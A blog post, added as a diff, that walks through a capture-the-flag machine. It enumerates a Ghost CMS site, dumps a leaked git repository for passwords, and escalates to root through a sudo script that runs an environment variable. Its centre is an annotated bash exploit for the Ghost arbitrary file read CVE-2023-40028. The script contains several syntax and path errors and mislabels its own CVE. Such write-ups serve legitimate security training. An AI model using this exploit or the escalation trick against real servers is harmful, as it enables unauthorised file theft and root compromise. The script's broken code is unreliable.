@@ -1,0 +1,279 @@
+---
+layout: post
+title: "LinkVortex 159b952552918047981de65e0ff2db19"
+date:   2025-07-15 12:05:57 -0400
+categories: writeups
+---
+
+# LinkVortex
+
+# 1. Enumeration
+
+Start enumerating open ports 
+
+![image.png]({{ '/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image.png' | relative_url }})
+
+There are only two ports open, a web application is running on port 80, we can see there is information about hardware 
+
+![image.png]({{ '/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_1.png' | relative_url }})
+
+# 2. User flag
+
+Looking around we realise it is powered by ghost, which is an application for publisher to manage their business
+
+![image.png]({{ '/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_2.png' | relative_url }})
+
+It is open source which means we can see their files in a git-hub repository
+
+![image.png]({{ '/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_3.png' | relative_url }})
+
+In security section there are info about some vulnerabilities found previously, but by now we don’t have enough information to perform an attack
+
+![image.png]({{ '/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_4.png' | relative_url }})
+
+Checking directories related with the repository we found a sign in page, it could be useful to find some credentials 
+
+![image.png]({{ '/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_5.png' | relative_url }})
+
+There is nothing much to do here, so let’s discover new subdomains to see if we could be able to get more information, fuzzing the HOST header we could find dev in v host, we could use: [Sublist3r](https://github.com/aboul3la/Sublist3r)
+
+![image.png]({{ '/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_6.png' | relative_url }})
+
+It’s suppose to be in construction
+
+![image.png]({{ '/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_7.png' | relative_url }})
+
+But getting information about directories, the whole repository is leaked here, making only curl request we won’t find what we need
+
+![image.png]({{ '/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_8.png' | relative_url }})
+
+That’s when git-dumper tool gets into action dumpling all the files it could find and saving them to a directory in this case gdump
+
+![image.png]({{ '/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_9.png' | relative_url }})
+
+First we try to get ghost version to see if there are some CVE’s on internet, it seems to be 4.0
+
+![image.png]({{ '/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_10.png' | relative_url }})
+
+Then we try to grep recursively all “password” plain text, we can see a los of test passwords, those seems to be like default passwords 
+
+![image.png]({{ '/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_11.png' | relative_url }})
+
+There are even hashes 
+
+![image.png]({{ '/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_12.png' | relative_url }})
+
+Those are different passwords we can see if they are present in the public repository
+
+![image.png]({{ '/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_13.png' | relative_url }})
+
+![image.png]({{ '/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_14.png' | relative_url }})
+
+![image.png]({{ '/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_15.png' | relative_url }})
+
+Effectively those passwords are present in the public files
+
+![image.png]({{ '/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_16.png' | relative_url }})
+
+After keeping searching there is another password, it seems a different password
+
+![image.png]({{ '/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_17.png' | relative_url }})
+
+![image.png]({{ '/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_18.png' | relative_url }})
+
+We see in the public files that this password is not  present which is a possible leakage, we tried to get in as admin or example or test in the graphical interface but we didn’t log in, password were wrong, search for vulnerabilities, there is an Arbitrary File Read with authenticated users and the version seems to be vulnerable
+
+![image.png]({{ '/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_19.png' | relative_url }})
+
+Here we have the admin api where we also can authenticate as admin
+
+![image.png]({{ '/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_20.png' | relative_url }})
+
+```bash
+#!/bin/bash
+
+#CVE-2023-40028
+#Ghost Arbitrary File Read
+
+GHOST_URL='http://linkvortex.htb'
+#Administrator endpoint
+GHOST_API="$GHOST_URL/ghost/api/v3/admin/"
+API_VERSION='v3.0'
+
+#Generating a folder where the script is executed
+PAYLOAD_PATH="`dirname $0`/exploit"
+#The name of the file
+PAYLOAD_ZIP_NAME=exploit.zip
+
+#Function to print usage showing how to execute the script
+function usage() {
+	echo "Usage: $ -u username -password"
+}
+
+#Reading arguments
+#waiting two arguments -u -p
+while getopts 'u:pÑ' flag; do
+	#Processing options 
+	case "${flag}" in
+		#Saving values in a variable
+		u) USERNAME="${OPTARG}" ;;
+		p) PASSWORD="${OPTARG}" ;;
+		#On error
+		*) usage
+			exit ;;
+		esac
+	done
+	
+#Checking if those variables are empty
+if [[ -z $USERNAME || -z $PASSWORD]]; then
+	usage
+	exit
+fi
+
+#Function to generate the payload
+function generate_exploit() {
+	#A local variables with the first argument of the funcion
+	local FILE_TO_READ=$1
+	#Redirecting /dev/urandom to the standar input of tr
+	#tr translates those into alphanumeric string
+	#Getting only the firsts 13
+	IMAGE_NAME=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 13; echo)
+	#Creating the directory where the payload will be stored
+	mkdir -p $PAYLOAD_PATH/content/images/2024/
+	#Generating a symlink to the target file
+	ln -s $FILE_TO_READ $PAYLOAD_PATH/content/image/2024/$IMAGE_NAME.png
+	#Zipping payload with the symlink
+	zip -r -y $PAYLOAD_ZIP_NAME $PAYLOAD_PATH/ &>/dev/null
+}
+
+function clean(){
+	rm $PAYLOAD_PATH/content/images/2024/$IMAGE_NAME.png
+	rm -ft $PAYLOAD_PATH
+	rm $PAYLOAD_ZIP_NAME
+}
+
+#Sign into ghost and save cookie in cookie.txt
+curl -c cookie.txt -d username=$USERNAME -d password=$PASSWORD \
+	-H "Origin: $GHOST_URL" \
+	-H "Accept-Version: v3.0" \
+	#Creating a new session
+	$GHOST_API/session/ &> /dev/null
+
+#Quiet check if cookie exists
+if ! cat cookie.txt | grep -q ghost-admin-api-session; then
+	echo "[!] INVALID CREDENTIALS"
+	rm cookie.txt
+	exit
+fi
+
+function send_exploit() {
+	RES=$(curl -s -b cookie.txt\
+		-H "Accept: text/plain, */*; q=0.01" \
+		-H "Accept-Language: en-US,en;q=0.5" \
+		-H "Accept-Encoding:"gzip, deflate, br" \
+		-H "X-Ghost-Version: 5.58" \
+		-H "App-Pragma: no-cache" \
+		#Making a request from JS object
+		-H "X-Requested-With: XMLHttpRequest" \
+		-H "Content-Type: multipart/from-data" \
+		-X POST\
+		-H "Origin: $GHOST_URL" \
+		-H "Referer: $GHOST_URL/ghost/" \
+		-F "importfile=@`dirname $PAYLOAD_PATH`/PAYLOAD_ZIP_NAME;type=application/zip" \
+		-H "form-data; name=\"importfile\"; filename=\"$PAYLOAD_ZIP_NAME\"" \
+		-H "Content-Type: application/zip" \
+		"$GHOST_URL/ghost/api/v3/admin/db")
+	#Last command not equals to 0
+	if [ $? -ne 0]; then
+		echo "[!] FAILED TO SEND THE EXPLOIT"
+		clean
+		exit
+	fi
+}
+	
+	
+echo "Welcome to the CVE-2023-40024 SHELL"
+#Creating a custom shell
+while true; do
+	#Display readline to pass an input
+	read -p "file> " INPUT
+	#Exit the shell
+	#[[]] supports ==
+	if [[ $INPUT == "exit"]];then
+		echo "Bye Bye!!"
+		break
+	fi
+	#Checking if input matches with a RE in this case a blank space
+	if [[ $INPUT =~ \  ]]; then
+		echo "PLEASE ENTER FULL FILE PATH WITHOUT SPACE"
+		continue
+	fi
+	#Valid input is not empty
+	if [ -z $INPUT ];then
+		echo "VALUE REQUIRED"
+		continue
+	fi
+	#Generate payload with the input
+	generate_exploit $INPUT
+	#Sending the malicious .zip file
+	send_exploit 
+	#Read the file uploaded
+	curl -b cookie.txt -s $GHOST_URL/content/images/2024/$IMAGE_NAME.png
+	clean
+done
+
+rm cookie.txt
+	
+```
+
+Execute the exploit and confirm the arbitrary file read
+
+![image.png]({{ '/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_21.png' | relative_url }})
+
+Now it’s time to find creds or something valuable it might be in config files
+
+![image.png]({{ '/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_22.png' | relative_url }})
+
+![image.png]({{ '/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_23.png' | relative_url }})
+
+We know the name of the config file but we don’t where it is, chat gpt helps us to find routes, in docker containers the config file is stored in
+
+![image.png]({{ '/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_24.png' | relative_url }})
+
+Effectively there it is, use credentials found in ssh to get user flag
+
+![image.png]({{ '/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_25.png' | relative_url }})
+
+![image.png]({{ '/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_26.png' | relative_url }})
+
+# 3.Priv esc
+
+Privilege escalation is pretty straightforward, first check at commands or scripts we can execute as root 
+
+![image.png]({{ '/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_27.png' | relative_url }})
+
+We have this script and we have certain control of CHECK_CONTENT environment variable also it  won’t reset itself to default values
+
+![image.png]({{ '/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_28.png' | relative_url }})
+
+We can analyze `clean_symlink.sh`
+
+![image.png]({{ '/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_29.png' | relative_url }})
+
+Basically it is receiving a .png file which is a symbolic link, this symlink is sanitized avoiding getting files that only root should have access, but the environment variable CHECK_CONTENT is not taking account here and we can set that variable to execute the commands we want to, it is only checking that this variable is not empty
+
+![image.png]({{ '/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_30.png' | relative_url }})
+
+We can see an example here, if that variable has a command catting a file in root folder it will read it, enter into the conditional statement if that script is executed with elevated privileges
+
+![image.png]({{ '/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_31.png' | relative_url }})
+
+![image.png]({{ '/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_32.png' | relative_url }})
+
+Make a symbolic link of a .png file to make the script work as expected and set the env variable catting the private key, that’s how this machine is pwned
+
+![image.png]({{ '/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_33.png' | relative_url }})
+
+![image.png]({{ '/assets/images/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463/d015c73b-0f2d-4d4a-80cd-80a11891dad9-export-8e6d717c-fd74-4639-ada8-688d931fa463_image_34.png' | relative_url }})
+
+Machine pwned!!!
